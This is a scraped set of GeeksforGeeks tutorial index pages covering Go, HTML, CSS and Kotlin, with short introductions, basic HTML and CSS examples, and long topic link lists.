Windows Installing Golang on MacOS Hello World! in Golang Golang vs C++ Golang vs Java Golang vs Python Fundamentals Identifiers in Golang Keywords in Golang Data Types Variables Constants Rune in Golang Operators in Golang Scope of Variables Type Casting var Keyword in Golang Short Declaration Operator(:=) var keyword vs short declaration operator Control Statements Decision Making Statements Loops in Golang Loop Control Statements Switch Statement in Go Deadlock and Default Case in Select Statement Functions & Methods What are the Functions? Variadic Function Anonymous Function main and init function Function Arguments Function Returning Multiple Values Named Return Values Blank Identifier Defer Methods Methods With Same Name Structure Structures Structure Equality Nested Structure Anonymous Structure and Fields Promoted Fields in Structure Promoted Methods in Structure Function as a Field in Structure Arrays & Slices Arrays in Golang Copying an Array into Another Array in Golang Passing an Array to a Function in Golang Slices in Golang Slice Composite Literal Copying one Slice into another Slice Passing a Slice to Function Comparing two Slices in Golang Checking the Equality of Slices in Golang Sorting a Slice in Golang Trimming a Slice in Golang Splitting a Slice in Golang String Strings in Golang Different ways to compare Strings Different ways to concatenate two strings Trimming a String in Golang Splitting a String in Golang Check if the given characters are present in String Repeating a String for Specific Number of Times Finding the index value of specified string Counting the Number of Repeated Characters in String Pointers Pointers Pointer to Pointer (Double Pointer) Pointers to a Function Returning Pointer from a Function Pointer to an Array as Function Argument Pointer to Struct Comparing Pointers Finding the Capacity of the Pointer Finding the Length of the Pointer Interfaces Interfaces Multiple Interfaces Embedding Interfaces Polymorphism Using Interfaces Concurrency Goroutines – Concurrency Select Statement Multiple Goroutines Goroutine vs Thread Channel in Golang Unidirectional Channel in Golang My Personal Notes arrow_drop_up Save Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseTypes of Environments in AITop 40 Python Interview Questions & AnswersProof that Clique Decision problem is NP-Complete | Set 2 Most Visited Articles Difference between List VS Set VS Tuple in PythonMajor Kernel Functions in Support Vector Machine (SVM)Top 5 IDEs for C++ That You Should Try OnceFibonacci Series Program in JavaScriptHow to send an email from JavaScript ? room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

HTML Tutorials - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ HTML Basicsexpand_moreHTML TutorialsHTML | IntroductionHTML full formHTML | EditorsHTML | CommentsHTML | BasicsHTML | LayoutHTML | ElementsHTML | HeadingHTML | ParagraphHTML | Text FormattingHTML | QuotationsHTML | Color Styles and HSLHTML | LinksHTML | ImagesHTML | TablesHTML | ListsHTML | Block and Inline ElementsHTML | IframesWhere to put JavaScript in an HTML Document ?HTML | File PathsHTML | Viewport meta tag for Responsive Web DesignHTML | Computer Code ElementsHTML | EntitiesHTML | CharsetsHTML | URL EncodingHTML | Deprecated TagsHTML Tagsexpand_moreHTML | DoctypesHTML | <a> TagHTML | abbr TagHTML | acronym TagHTML | address TagHTML | applet TagHTML area TagHTML5 | article tagHTML5 | <aside> TagHTML5 | AudioHTML | b TagHTML | base TagHTML | <basefont> TagHTML | Tags Complete ReferenceHTML Attributesexpand_moreHTML | AttributesHTML | <input> accept AttributeHTML | <form> accept-charset AttributeHTML | accesskey AttributeHTML| action AttributeHTML align AttributeHTML | alt attributeHTML | <script> async AttributeHTML | <input> autocomplete AttributeHTML | <form> autocomplete AttributeHTML | autofocus AttributeHTML | <input> autofocus AttributeHTML | <button> autofocus AttributeHTML | <textarea> autofocus AttributeHTML | Attributes Complete ReferenceHTML Graphicsexpand_moreHTML | SVG-BasicsHTML | Canvas BasicsHTML APIsexpand_moreHTML | GeolocationHTML | Drag and DropHTML DOMexpand_moreDOM (Document Object Model)HTML | DOM activeElement PropertyHTML | DOM anchors CollectionHTML | DOM close() MethodHTML | DOM baseURI PropertyHTML | DOM body PropertyHTML | DOM createAttribute() MethodHTML | DOM doctype PropertyHTML | DOM writeln() MethodHTML | DOM console.error() MethodHTML | DOM URL PropertyHTML | DOM embeds CollectionHTML | DOM console.warn() MethodHTML | DOM console.trace() MethodHTML | DOM Complete ReferenceHTML Audio/Videoexpand_moreHTML | DOM Audio ObjectHTML | DOM Video ObjectHTML | DOM Video canPlayType( ) MethodHTML | DOM Audio audioTracks PropertyHTML | DOM Audio autoplay PropertyHTML | DOM Audio buffered PropertyHTML | DOM Audio controls PropertyHTML | DOM Audio currentSrc PropertyHTML | DOM Audio currentTime PropertyHTML | DOM Audio defaultMuted PropertyHTML | DOM Audio defaultPlaybackRate PropertyHTML | DOM Audio duration PropertyHTML | DOM Audio ended PropertyHTML | DOM Audio loop PropertyHTML | DOM Audio/Video Complete ReferenceHTML 5expand_moreHTML5 | IntroductionHTML | Spell CheckHTML5 Complete ReferenceHTML 5 MathMLexpand_moreHTML5 | MathML IntroductionHTML5 | MathML <maction> tagHTML5 | MathML <math> tagHTML5 | MathML <menclose> TagHTML5 | MathML <merror> TagHTML5 | MathML <mfenched> tagHTML5 | MathML <mfrac> tagHTML5 | MathML <mglyph> TagHTML5 | MathML <mi> TagHTML5 | MathML <mlabeledtr> tagHTML5 | MathML <mmultiscripts> TagHTML5 | MathML <mn> TagHTML5 | MathML <mo> TagHTML5 | MathML <mover> TagHTML5 | MathML <mpadded> TagHTML5 | MathML Complete ReferenceHTML Courseexpand_moreIntroduction to HTML CSS | Learn to Design your First Website in Just 1 WeekHTML Course | Structure of an HTML DocumentHTML Course | First Web Page | Printing Hello WorldHTML Course | Basics of HTMLHTML Course – Starting the Project | Creating DirectoriesHTML Course | Understanding and Building Project StructureHTML Course | Practice Quiz 1HTML Course | Creating Navigation MenuHTML Course | Building Header of the WebsiteHTML Course | Building Main Content – Section 1HTML Course | Building Main Content – Section 2HTML course | Building Main Content – Section 3HTML Course | Building FooterHTML Questionsexpand_moreCreate a Sticky Social Media Bar using HTML and CSSCreate a Search Bar using HTML and CSSHow to create Right Aligned Menu Links using HTML and CSS ?How to add a Login Form to an Image using HTML and CSS ?How to Create a Tab Image Gallery ?How to create a Hero Image using HTML and CSS ?How to design Meet the Team Page using HTML and CSS ?How to Create an Image Overlay Icon using HTML and CSS ?How to Create Browsers Window using HTML and CSS ?How to Create Breadcrumbs using HTML and CSS ?How to Create Section Counter using HTML and CSS ?How to Create Toggle Switch by using HTML and CSS ?How to Create a Cutout Text using HTML and CSS ?How to make a Pagination using HTML and CSS ? HTML Tutorials HTML stands for HyperText Markup Language. It is used to design web pages using a markup language. HTML is the combination of Hypertext and Markup language. Hypertext defines the link between the web pages. A markup language is used to define the text document within tag which defines the structure of web pages. HTML is a markup language that is used by the browser to manipulate text, images, and other content to display it in the required format. Characteristics of HTML: Easy to understand: It is the easiest language you can say, very easy to grasp this language and easy to develop. Flexibility: This language is so much flexible that you can create whatever you want, a flexible way to design web pages along with the text. Linkable: You can make linkable text like users can connect from one page to another page or website through these characteristics. Limitless features: You can add videos, gifs, pictures or sound anything you want that will make the website more attractive and understandable. Support: You can use this language to display the documents on any platform like Windows, Linux or Mac. HTML Structure: The structure of HTML document are given below: <!DOCTYPE html> <html> <head> <title> <!-- title bar --> </title> <!-- header for the website --> </head> <body> <!-- body section of the website --> </body> </html> Introduction to HTML CSS | Learn to Design your First Website in Just 1 Week ‘Recent Articles’ on HTML Topics : Basics HTML5 Tags Attributes DOM Misc Complete Reference Basics: HTML | Introduction HTML | Editors HTML | Basics HTML | Attributes HTML | Paragraph HTML | Text Formatting HTML | Quotations HTML | Tables HTML | Lists HTML | Spell Check HTML | Color Styles and HSL HTML | Geolocation HTML | Drag and Drop HTML | Charsets HTML | Images HTML | Doctypes HTML | Layout HTML | File Paths HTML | Iframes HTML | Links HTML | Deprecated Tags HTML | URL Encoding HTML | SVG-Basics HTML | Canvas Basics HTML | Computer Code Elements HTML | Entities More>> HTML5: HTML 5 | Introduction HTML 5 | <article> Tag HTML 5 | <aside> Tag HTML 5 | <aside> Tag HTML 5 | <bdi> Tag HTML 5 | <details> Tag HTML 5 | <dialog> tag HTML 5 | <figcaption> Tag HTML 5 | <figure> Tag HTML 5 | <footer> Tag HTML5 | <header> Tag HTML 5 | <progress> Tag HTML 5 | <rp> Tag HTML 5 | <mark> Tag HTML 5 | <meter> Tag HTML 5 | <nav> Tag HTML 5 | <fieldset> Tag HTML 5 | Mathematical operators HTML 5 | Video HTML 5 | translate Attribute More>> Tags: HTML | <!–…–> HTML | <!DOCTYPE> HTML | <a> Tag HTML | <abbr> Tag HTML | <acronym> Tag HTML | <address> Tag HTML | <applet> Tag HTML | <area> Tag HTML | <article> Tag HTML | <aside> Tag HTML | <Audio> Tag HTML | <b> Tag HTML | <base> Tag HTML | <basefont> Tag HTML | <bdi> Tag HTML | <bdo> Tag HTML | <big> Tag HTML | <blockquote> Tag HTML | <body> Tag HTML | <br> Tag More>> Attributes: HTML | accept Attribute HTML | accept-charset Attribute HTML | accesskey Attribute HTML | action; Attribute HTML | autofocus Attribute HTML | charset Attribute HTML | checked Attribute HTML | Class Attribute HTML | cols Attribute HTML | colspan Attribute HTML | content Attribute HTML | contenteditable Attribute HTML | data Attribute HTML | data-* Attribute HTML | datetime Attribute HTML | dir Attribute HTML | dirname Attribute HTML | disabled Attribute HTML | draggable Attribute HTML | dropzone Attribute More>> DOM: HTML | DOM Introduction HTML | DOM activeElement Property HTML | DOM anchors Collection HTML | DOM close() Method HTML | DOM baseURI Property HTML | DOM body Property HTML | DOM createAttribute() Method HTML | DOM doctype Property HTML | DOM writeln() Method HTML | DOM console.error() Method HTML | DOM URL Property HTML | DOM embeds Collection HTML | DOM console.warn() Method HTML | DOM console.trace() Method HTML | DOM title Property HTML | DOM createComment() Method HTML | DOM console.time() Method HTML | DOM History forward() Method HTML | DOM console.log() Method HTML | DOM Location hash Property More>> Misc: Most commonly used tags in HTML Difference Between HTML and ASP Creating a responsive Modal Sign-Up form HTML | Responsive full page image using CSS Range Slider in HTML using JavaScript getAttribute() – Passing data from Server to JSP Convert an image into grayscale image using HTML/CSS How to align Placeholder Text in HTML ? Hide or show elements in HTML using display property Form validation using HTML and JavaScript DHTML JavaScript How to remove the space between inline-block elements Adding Google Maps With A Marker More>> Complete Reference: HTML | Tags Complete Reference HTML | Attributes Complete Reference HTML | DOM Complete Reference HTML | DOM Audio/Video Complete Reference If you like GeeksforGeeks and would like to contribute, you can also write an article and mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks. Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above. My Personal Notes arrow_drop_up Save Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseTypes of Environments in AIDesign Twitter - A System Design Interview QuestionTop 40 Python Interview Questions & Answers Most Visited Articles Proof that Clique Decision problem is NP-Complete | Set 2Difference between List VS Set VS Tuple in Python5 Common System Design Concepts for Interview PreparationMajor Kernel Functions in Support Vector Machine (SVM)Why non-static variable cannot be referenced from a static method in Java room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

CSS Tutorials - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ CSS Basicsexpand_moreCSS TutorialsCSS IntroductionCSS Full FormWhat is the best way to include CSS file? Why use @import?CSS | CommentsCSS | ColorsCSS | BackgroundCSS | BordersCSS | Margins and PaddingCSS | Height and WidthCSS | Box modelCSS | OutlineCSS | Text FormattingCSS | FontsCSS | IconsCSS | LinksCSS | LISTSCSS | TablesCSS | OverflowCSS FloatCSS | AlignCSS | CombinatorsCSS | Pseudo-classesCSS | Pseudo ElementsCSS | Opacity / TransparencyCSS | DropDownsCSS | Image GalleryCSS | Image SpritesCSS | Styling FormsCSS | CountersCSS | Website LayoutCSS | UnitsCSS | SpecificityCSS Propertiesexpand_moreCSS | all PropertyCSS | Display propertyCSS | Positioning ElementsCSS border PropertyCSS | border-image PropertyCSS | filter PropertyCSS | flex PropertyCSS | font-family PropertyCSS | grid PropertyCSS | height PropertyCSS | Properties Complete ReferenceCSS Selectorsexpand_moreCSS | Syntax and SelectorsCSS | #id SelectorCSS | * SelectorCSS | Class SelectorCSS | element SelectorCSS | :hover SelectorCSS | :lang SelectorCSS | :nth-child() SelectorCSS | :visited SelectorWildcard Selectors (*, ^ and $) in CSS for classesAdvanced Selectors in CSS10 CSS Selectors Every Developer Should KnowCSS | Selectors Complete ReferenceCSS Functionsexpand_moreCSS | attr() FunctionCSS | calc() FunctionCSS env() FunctionCSS | hsl() FunctionCSS | rgb() FunctionCSS | url() FunctionCSS | var() FunctionCSS | Functions Complete ReferenceCSS Advancedexpand_moreCSS | 2D TransformsCSS | 3D TransformsCSS | media queriesCSS | PaginationCSS | GradientsCSS | Shadow EffectCSS | AnimationsCSS | Border ImagesCSS | ButtonsAdvance CSS layout with flexboxCSS | VariablesAdding HTML entities using CSS contentCSS | Web FontsCSS Pluginsexpand_moreCSS MarqueeMenu PluginCSS Stacking Page PluginCSS Questionsexpand_moreHow order of classes work in CSS ?Create a transparent border with CSSWhat is the use of asterisk (*) selector in CSS ?How to Create Wave Background using CSS ?How to create shapes using CSS ?How to create wave ball effect using CSS?How to create text-fill animation using CSS ?SASSexpand_moreCSS Preprocessor | SASSSASS | IntroductionSASS | SyntaxSASS | CommentsSASS | VariablesSASS | @importSASS | @mixin and @includeSass @extend RuleSass @each RuleSASS | @if and @elseSASS | OperatorsSASS | Numeric operatorsSASS | Placeholder SelectorsSASS | NestingSASS | Parent SelectorSASS | Booleans and Boolean operatorsSASS | Shadowing and Flow ControlSASS | InterpolationMaterializeexpand_moreMaterialize | Introduction and InstallationMaterialize CSS | ColorsMaterialize CSS | GridsMaterialize CSS | HelpersMaterialize CSS | MediaMaterialize CSS – Pulse and ShadowMaterialize CSS | TypographyMaterialize CSS | BadgesMaterialize CSS | ButtonsMaterialize CSS | BreadcrumbsMaterialize | CardsMaterialize CSS | CollectionsMaterialize CSS | FooterMaterialize CSS | IconsMaterialize CSS NavbarsMaterialize CSS | PaginationMaterialize CSS | PreloaderMaterialize | CollapsibleMaterialize CSS DropdownMaterialize CSS SwitchesMaterialize CSS Checkbox CSS Tutorials Cascading Style Sheets, fondly referred to as CSS, is a simply designed language intended to simplify the process of making web pages presentable. CSS allows you to apply styles to web pages. More importantly, CSS enables you to do this independent of the HTML that makes up each web page. There are three types of CSS which are given below: Inline CSS Internal or Embedded CSS External CSS Inline CSS: Inline CSS contains the CSS property in the body section attached with element is known as inline CSS. This kind of style is specified within an HTML tag using the style attribute. Example: <!DOCTYPE html> <html> <head> <title>Inline CSS</title> </head> <body> <p style = "color:#009900; font-size:50px; font-style:italic; text-align:center;"> GeeksForGeeks </p> </body> </html> Output: Internal or Embedded CSS: This can be used when a single HTML document must be styled uniquely. The CSS rule set should be within the HTML file in the head section i.e the CSS is embedded within the HTML file. Example: <!DOCTYPE html> <html> <head> <title>Internal CSS</title> <style> .main { text-align:center; } .GFG { color:#009900; font-size:50px; font-weight:bold; } .geeks { font-style:bold; font-size:20px; } </style> </head> <body> <div class = "main"> <div class ="GFG">GeeksForGeeks</div> <div class ="geeks"> A computer science portal for geeks </div> </div> </body> </html> Output: External CSS: External CSS contains separate CSS file which contains only style property with the help of tag attributes (For example class, id, heading, … etc). CSS property written in a separate file with .css extension and should be linked to the HTML document using link tag. This means that for each element, style can be set only once and that will be applied across web pages. Example: The file given below contains CSS property. This file save with .css extension. For Ex: geeks.css body { background-color:powderblue; } .main { text-align:center; } .GFG { color:#009900; font-size:50px; font-weight:bold; } #geeks { font-style:bold; font-size:20px; } Below is the HTML file that is making use of the created external style sheet link tag is used to link the external style sheet with the html webpage. href attribute is used to specify the location of the external style sheet file. <!DOCTYPE html> <html> <head> <link rel="stylesheet" href="geeks.css"/> </head> <body> <div class = "main"> <div class ="GFG">GeeksForGeeks</div> <div id ="geeks"> A computer science portal for geeks </div> </div> </body> </html> Output: Properties of CSS: Inline CSS has the highest priority, then comes Internal/Embedded followed by External CSS which has the least priority. Multiple style sheets can be defined on one page. If for an HTML tag, styles are defined in multiple style sheets then the below order will be followed. As Inline has the highest priority, any styles that are defined in the internal and external style sheets are overridden by Inline styles. Internal or Embedded stands second in the priority list and overrides the styles in the external style sheet. External style sheets have the least priority. If there are no styles defined either in inline or internal style sheet then external style sheet rules are applied for the HTML tags. Introduction to HTML CSS | Learn to Design your First Website in Just 1 Week ‘Recent Articles’ on CSS Topics : Basics Properties Functions Selectors CSS Advanced Misc CSS Complete Reference CSS Complete Reference: CSS | Properties Complete Reference CSS | Selectors Complete Reference CSS | Functions Complete Reference If you like GeeksforGeeks and would like to contribute, you can also write an article and mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks. Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above. My Personal Notes arrow_drop_up Save Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseDesign Twitter - A System Design Interview QuestionTop 40 Python Interview Questions & AnswersProof that Clique Decision problem is NP-Complete | Set 2 Most Visited Articles Difference between List VS Set VS Tuple in Python5 Common System Design Concepts for Interview PreparationMajor Kernel Functions in Support Vector Machine (SVM)Why non-static variable cannot be referenced from a static method in JavaWays to import CSV files in Google Colab room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Kotlin Programming Language - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Write an Articleexpand_moreWrite ArticlesWrite Interview ExperienceGuidelines to WriteGet Technical Writing InternshipCC++JavaPythonMachine LearningInterview Preparationexpand_moreInterview Preparation For Software DevelopersMust Coding Questions - Company-wise Must Do Coding Questions - Topic-wiseCompany-wise Practice ProblemsCompany PreparationCompetitive ProgrammingSoftware Design-PatternsCompany-wise Interview ExperienceExperienced - Interview ExperiencesIntership - Interview ExperiencesPractice @Geeksforgeeksexpand_moreLeaderboard !!Topic-wise PracticeSubjective ProblemsDifficulty Level - SchoolDifficulty Level - BasicDifficulty Level - EasyDifficulty Level - MediumDifficulty Level - HardExplore More...Algorithmsexpand_moreAnalysis of AlgorithmsSearching AlgorithmsSorting AlgorithmsPattern SearchingGeometric AlgorithmsMathematical AlgorithmsRandomized AlgorithmsGreedy AlgorithmsDynamic ProgrammingDivide & ConquerBacktrackingBranch & BoundAll AlgorithmsData Structuresexpand_moreArraysLinked ListStackQueueBinary TreeBinary Search TreeHeapHashingGraphAdvance Data StructuresMatrixStringAll Data StructuresProgramming Languagesexpand_moreCC++JavaPythonC#Go LangSQLPHPScalaPerlKotlinWeb Technologiesexpand_moreHTMLCSSBootstrapJavaScriptJqueryReactJSNodeJSAngularJSDjango FrameworkTutorial Libraryexpand_morePython TutorialDjango TutorialPandas TutorialKivy TutorialTkinter TutorialOpenCV TutorialSelenium TutorialComputer Science Subjectsexpand_moreEngineering MathematicsOperating SystemsDBMSComputer NetworkComputer Organization & ArchitectureTOCCompiler DesignDigital Elec. & Logic DesignSoftware EngineeringGATE 2021expand_moreGATE CS NotesGate CornerPrevious Year GATE PapersLast Minute Notes (LMNs)Important Topic - GATE 2021GATE 2021 CourseUGC NET / ISROexpand_moreUGC NET Notes - Paper IIUGC NET Notes - Paper IIIUGC NET Solved PapersISRO CS Solved PapersISRO Official KeysISRO CSE SyllabusQUIZ Sectionexpand_moreC QuizC++ QuizJava QuizPython QuizData Structures QuizAlgorithms QuizAptitude QuizTopic-wise MCQsPuzzlesGeeksforgeeks Initiativesexpand_moreCampus Ambassador ProgramGeek Of The MonthGeek On The TOPCampus Geek Of The MonthTechnical Scripter EventComputer Science Projects Kotlin Programming Language Kotlin is a statically typed, general-purpose programming language developed by JetBrains, that has built world-class IDEs like IntelliJ IDEA, PhpStorm, Appcode, etc. It was first introduced by JetBrains in 2011 and a new language for the JVM. Kotlin is object-oriented language, and a “better language” than Java, but still be fully interoperable with Java code. Kotlin is sponsored by Google, announced as one of the official languages for Android Development in 2017. Kotlin Android Tutorial Recent Articles on Kotlin! Overview, Basics, Control Flow, Array & String, Functions, Collections, OOPs Concept, Exception Handling, Null Safety, Regex & Ranges, Java Interoperability, Miscellaneous, Android Overview Introduction to Kotlin Kotlin Environment setup for Command Line Kotlin Environment setup with Intellij IDEA Hello World program in Kotlin Basics Kotlin Data Types Kotlin Variables Kotlin Operators Kotlin Standard Input/Output Kotlin Type Conversion Kotlin Expression, Statement and Block Control Flow Kotlin if-else expression Kotlin while loop Kotlin do-while loop Kotlin for loop Kotlin when expression Kotlin Unlabeled break Kotlin labeled break Kotlin unlabeled continue Kotlin labeled continue Array & String Kotlin Array Kotlin String Functions Kotlin functions Kotlin | Default and Named argument Kotlin Recursion Kotlin Tail Recursion Lambdas Expressions and Anonymous Functions Kotlin Inline functions Kotlin infix function notation Kotlin Higher-Order Functions Collections Kotlin Collections Kotlin list : Arraylist Kotlin list : listOf() Kotlin Set : setOf() Kotlin mutableSetOf() Kotlin hashSetOf() Kotlin Map : mapOf() Kotlin Hashmap OOPs Concept Kotlin Class and Objects Kotlin Nested class and Inner class Kotlin Setters and Getters Kotlin | Class Properties and Custom Accessors Kotlin Constructor Kotlin Visibility Modifiers Kotlin Inheritance Kotlin Interfaces Kotlin Data Classes Kotlin Sealed Classes Kotlin Abstract class Enum classes in Kotlin Kotlin extension function Kotlin generics Exception Handling Kotlin Exception Handling | try, catch, throw and finally Kotlin Nested try block and multiple catch block Null Safety Kotlin Null Safety Kotlin | Type Checking and Smart Casting Explicit type casting Regex & Ranges Kotlin Regular Expression Kotlin Ranges Java Interoperability Java Interoperability – Calling Kotlin from Java Java Interoperability – Calling Java from Kotlin Miscellaneous Kotlin annotations Kotlin Reflection Kotlin Operator Overloading Destructuring Declarations in Kotlin Equality evaluation in Kotlin Comparator in Kotlin Triple in Kotlin Pair in Kotlin Kotlin | apply vs with Android Kotlin Android Tutorial How to create project in Android Studio using Kotlin How to install Android Virtual Device(AVD) Android Animations in Kotlin Android Fade In/Out in Kotlin Android Menus Android progress notifications in Kotlin Android Project folder Structure My Personal Notes arrow_drop_up Save Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseProof that Clique Decision problem is NP-Complete | Set 2Major Kernel Functions in Support Vector Machine (SVM)Top 5 IDEs for C++ That You Should Try Once Most Visited Articles How to find index of a given element in a Vector in C++How to update Node.js and NPM to next version ?How to drop rows in Pandas DataFrame by index labels?How to create an empty DataFrame and append rows & columns to it in Pandas?Replace NaN Values with Zeros in Pandas DataFrame room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

